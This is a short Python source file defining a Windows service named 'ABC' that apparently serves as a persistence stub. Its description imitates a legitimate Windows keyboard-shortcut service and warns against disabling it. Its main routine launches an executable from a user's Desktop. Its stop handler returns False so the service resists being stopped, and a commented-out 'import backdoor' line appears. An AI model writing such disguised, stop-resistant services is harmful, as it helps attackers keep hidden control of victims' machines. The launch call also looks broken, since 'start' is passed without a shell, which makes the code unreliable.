from local_libs import service
import servicemanager
import sys
import time
import os
import subprocess
# import backdoor


class Main(service.WinService):
    _svc_name_ = "ABC"
    _svc_display_name_ = "ABC"
    _svc_description_ = "Enables and supports the use of keyboard shortcuts on keyboards, remote controls, and other " \
                        "multimedia devices. Disabling this service is not recommended."

    def __init__(self, args):
        super().__init__(args)
        self.is_running = False

    def start(self):
        self.is_running = True

    def main(self):
        # with open("C:/Users/User/Desktop/test.txt", "w") as f:
        #     f.write("Windows service")
        FNULL = open("C:/test.txt", "w")
        test_path = r"C:\Users\User\Desktop\test.exe"
        subprocess.Popen(["start", test_path], stdout=FNULL, shell=False)
        # subprocess.run(command, shell=False)
        time.sleep(5)

    def SvcStop(self):
        return False


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(Main)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        Main.parse_command_line()
